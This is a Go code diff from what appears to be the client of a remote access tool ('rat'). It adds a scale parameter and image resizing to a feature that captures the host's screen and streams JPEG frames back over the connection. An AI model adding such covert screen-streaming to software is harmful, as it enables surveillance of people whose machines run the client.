@@ -5,13 +5,14 @@ import (
 	"image/jpeg"
 	"rat/client/screen"
 	"rat/common"
+
+	"github.com/disintegration/imaging"
 )
 
 var screenStream bool
 
 type ScreenPacket struct {
-	IncomingPacket
-	OutgoingPacket
+	Scale float32
 }
 
 func (packet ScreenPacket) GetHeader() common.PacketHeader {
@@ -20,12 +21,20 @@ func (packet ScreenPacket) GetHeader() common.PacketHeader {
 
 func (packet ScreenPacket) Read(c *Connection) error {
 	run, err := c.ReadBool()
+	if err != nil {
+		return err
+	}
 
-	screenStream = run
+	scale, err := c.ReadFloat()
+	if err != nil {
+		return err
+	}
 
 	if run {
 		// Dispatch one screen packet
-		Queue <- ScreenPacket{}
+		screenStream = false
+		Queue <- ScreenPacket{scale}
+		screenStream = run
 	}
 
 	return err
@@ -36,7 +45,16 @@ func (packet ScreenPacket) Write(c *Connection) error {
 
 	var w bytes.Buffer
 
-	jpeg.Encode(&w, screen.Capture(screen.Monitors[0]), &jpeg.Options{
+	img := screen.Capture(screen.Monitors[0])
+
+	if packet.Scale > 0 && packet.Scale < 1.0 {
+		width := float32(img.Bounds().Max.X) * packet.Scale
+		height := float32(img.Bounds().Max.Y) * packet.Scale
+
+		img = imaging.Resize(img, int(width), int(height), imaging.NearestNeighbor)
+	}
+
+	jpeg.Encode(&w, img, &jpeg.Options{
 		Quality: 75,
 	})
 
@@ -46,7 +64,7 @@ func (packet ScreenPacket) Write(c *Connection) error {
 	// Send another screen packet if we're still streaming
 	if screenStream {
 		go func() {
-			Queue <- ScreenPacket{}
+			Queue <- packet
 		}()
 	}
 
